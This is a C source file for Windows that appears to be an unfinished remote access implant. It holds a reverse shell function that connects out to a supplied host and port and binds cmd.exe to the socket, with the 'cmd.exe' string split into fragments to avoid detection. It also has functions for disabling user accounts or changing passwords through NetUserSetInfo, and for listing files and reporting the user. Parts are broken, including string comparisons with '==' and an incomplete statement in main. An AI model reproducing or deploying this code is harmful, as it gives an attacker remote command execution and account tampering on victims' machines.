
/* Add these things

	cd 		-> change directory
	shell 	-> to start cmd promt
	pwd		-> current directory



*/

// Compile : gcc .\HttpSendRequest.c -o .\HttpSendRequest.exe -lws2_32 -luser32 -lwininet -lnetapi32 -s



#include<stdio.h>	// printf, scanf
#include<winsock2.h>
#include<Windows.h>
#include<ws2tcpip.h>
#include<strsafe.h>	// StringCchLength, StringCchCopy, StringCchCat 
#include<lm.h>		//netusersetinfo
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "netapi32.lib")
#define BUFFER_SIZE 1000

void whoami() {
	TCHAR info_System[BUFFER_SIZE], info_User[BUFFER_SIZE];
	DWORD CharCount = BUFFER_SIZE;
	BOOL a;	// to store boolien output of API calls

	a = GetComputerNameExA(ComputerNameNetBIOS, info_System, &CharCount);
	a = GetUserName(info_User, &CharCount);

	printf("%s\\%s", info_System, info_User);

}


void ls(char* inputDir) {
	WIN32_FIND_DATA fileData;	// Stucture for storing all the file info
	LARGE_INTEGER fileSize;
	TCHAR direc[128];			// TCHAR acts a WCHAR if unicode otherwise it acts a CHAR
	size_t dirLen;				// Length of string is always size_t type

	StringCchLength(inputDir, 128, &dirLen);	// Finding length of inputDir
	if (inputDir)

		StringCchCopy(direc, 128, inputDir);	// Copying input dir to direc
	StringCchCat(direc, 128, "\\*");		// Adding \* at the end of it make it search for all files

	HANDLE hdata;							// It Creates and keeps the record of our progress
	hdata = FindFirstFile(direc, &fileData);	// Find First file and save the data to fileData

	do {																	// Goes through loop and files all the files one by one and prints their values
		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			printf("	%s <Dir>\n", fileData.cFileName);
		}
		else {
			fileSize.HighPart = fileData.nFileSizeHigh;
			fileSize.LowPart = fileData.nFileSizeLow;

			printf("	%s		%lld bytes\n", fileData.cFileName, fileSize.QuadPart);

		}
	} while (FindNextFile(hdata, &fileData) != 0);							// If next file exists then do

}



int Shell(char* host, int port){
    int tries = 3;
	while(tries > 0){    // To run in loop and check for connection every 5 sec
        Sleep(5000);
        printf("[+] Starting Connection\n");
        SOCKET mySock;
        struct sockaddr_in saddr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL, (unsigned int)NULL, (unsigned int)NULL);
        saddr.sin_family = AF_INET;

        saddr.sin_addr.s_addr = inet_addr(host);
        saddr.sin_port = htons(port);

        int tryConnect = WSAConnect(mySock,(SOCKADDR*)&saddr,sizeof(saddr),NULL,NULL,NULL,NULL);

        // Checking if connection is Established
        if(tryConnect < 0){
            closesocket(mySock);
            WSACleanup();
            printf("[-] Connection Failed :(\n");
            //exit(0);
            continue;
        }
        else{
            printf("[+] Connection Established\n");
            char RecvData[1024],recv1[1024];
            memset(RecvData,0,sizeof(RecvData));
            printf("[+] Starting to Recieve Data\n");
            int RecvCode = recv(mySock, RecvData, 1024, 0);
            
            // Testing connection
            if(RecvCode < 0){
                closesocket(mySock);
                WSACleanup();
                printf("[-] Recieve Data Failed \n");
                //exit(0);
                continue;
            }
            else{
                printf("[+] Recieve Data Successfull\n");
                printf("[+] Starting Process\n");
                
                //Starting Process to run cmd.exe on execution
                char *arr[4] = { "cm","d.e","x","e" };
                char command[8] = "";

                snprintf(command, sizeof(command),"%s%s%s%s",arr[0],arr[1],arr[2],arr[3]);

                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;

                memset(&sinfo,0,sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdError = sinfo.hStdOutput = (HANDLE) mySock;

                CreateProcess(NULL,command,NULL,NULL,TRUE,0,NULL,NULL, &sinfo,&pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                printf("[+] Process Running\n");

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySock, RecvData, 1024, 0);
                if(RecvCode <= 0){
                    closesocket(mySock);
                    WSACleanup();
                    printf("[-] No Data recieved\n");
                    //exit(0);
                    continue;
                }

                // Type bye or Bye to exit loop
                else if((RecvData[0] == 'b' || RecvData[0] == 'B' )&& RecvData[1] == 'y' && RecvData[2] == 'e'){
                    printf("[+] Exit signal Recieved\n");
                    closesocket(mySock);
                    WSACleanup();
                    exit(0);
                }
                // else{
                //     printf("++++++"<<typeid(RecvData).name()<<" "<<RecvData<<"++++++"<<typeid(bb).name()<<" "<<bb<<"+\n");
                // }

            }
        }
        printf("[ ] Retrying Connection\n");
		tries = tries - 1;
    }
}


void ChangeAccount(char* cmd, char* UserName, char* ServerName){

	if(ServerName == "localhost" || ServerName == "" || ServerName == "127.0.0.1"){
		ServerName = NULL;
	}

	DWORD dwlevel;
	NET_API_STATUS nStatus;
	
	if(cmd == "DisableAccount"){
		dwlevel = 1008;
		USER_INFO_1008 ui;
		ui.usri1008_flags = UF_SCRIPT | UF_ACCOUNTDISABLE;
		nStatus = NetUserSetInfo(ServerName, UserName, dwlevel, (LPBYTE)&ui, NULL);
	}
	else if(cmd == "ChangePassword"){
		dwlevel = 1003;
		USER_INFO_1003 ui;
		ui.usri1003_password;
		nStatus = NetUserSetInfo(ServerName, UserName, dwlevel, (LPBYTE)&ui, NULL);
	}
	else{
		USER_INFO_1008 ui;
	}
	// add rest of them here

	if(nStatus == NERR_Success){
        fwprintf(stderr,L"User account %s has been updated\n", UserName);
    }
    else{
        fprintf(stderr, "A system error has occurred: %d\n", nStatus);
    }

}


void HTTPconnections() {

	// printf("inseide HTTPconnection\n");
	WSADATA winsockdata;
	SOCKET sendingSocket;		// A pointer which points to our socket

	SOCKADDR_IN ServerAddr;// , ThisSenderInfo;	// Nested stucture which Stores info where our Socket will connect
	unsigned int Port = 80;
	int RetCode;

	TCHAR SendBuf[4096], RecvBuff[20000];
	// int BytesSent, nlen;

	WSAStartup(MAKEWORD(2, 2), &winsockdata);	// Initialising Socket version 2.2

	// printf("WSAStartup done\n");

	sendingSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);	// Creating New Socket with ipv4, in TCP connection and protocol to be TCP
	if (sendingSocket == INVALID_SOCKET) {
		printf("Error while creating a Socket: %ld\5n", WSAGetLastError());
		closesocket(sendingSocket);
		WSACleanup();	// Cleanup the Socket which was created
		return;
	}
	else {
		ServerAddr.sin_family = AF_INET;
		ServerAddr.sin_port = htons(Port);
		ServerAddr.sin_addr.s_addr = inet_addr("1.1.1.1");

		RetCode = WSAConnect(sendingSocket, (SOCKADDR*)& ServerAddr, sizeof(ServerAddr), NULL, NULL, NULL, NULL);	// Try to connect to Socket;

		if (RetCode != 0) {
			printf("Error while Trying to connecting to Socket: %ld\n", WSAGetLastError());
			WSACleanup();
			return;
		}
		else {
			memset(SendBuf, 0, sizeof(SendBuf));
			//SendBuf = "GET / HTTP/1.1\r\nHost: 1.1.1.1\r\n";
			StringCchCopy(SendBuf, 4096, "GET / HTTP/1.1\nHost: 1.1.1.1\n\n");
			memset(RecvBuff, 0, sizeof(RecvBuff));
			RetCode = send(sendingSocket, SendBuf, strlen(SendBuf) + 1, 0);
			RetCode = recv(sendingSocket, RecvBuff, 20000, 0);

			if (RetCode < 0) {
				closesocket(sendingSocket);
				WSACleanup();
				printf("Error occured while recieving data: %ld\n", WSAGetLastError());
				return;
			}
			else {
				printf("%s\n\n\n\n", RecvBuff);
			}
		}
	}
}



int main(int argc, char** argv) {

	// WCHAR a[128];
	// printf("cmd> ");
	// wscanf_s("%s", &a,(unsigned)_countof(a));
	// wprintf("\n%s\n\n\n", a);
	// char who[] = {'w','h','o','a','m','i'};

	if (strcmp(argv[1], "whoami") == 0) whoami();

	else if (strcmp(argv[1], "ls") == 0) ls(argv[2]);

	else if(strcmp)
	// else {
	// 	printf("Nothing Happend: %s", argv[1]);
	// }
	// HTTPconnections();

	return 0;
}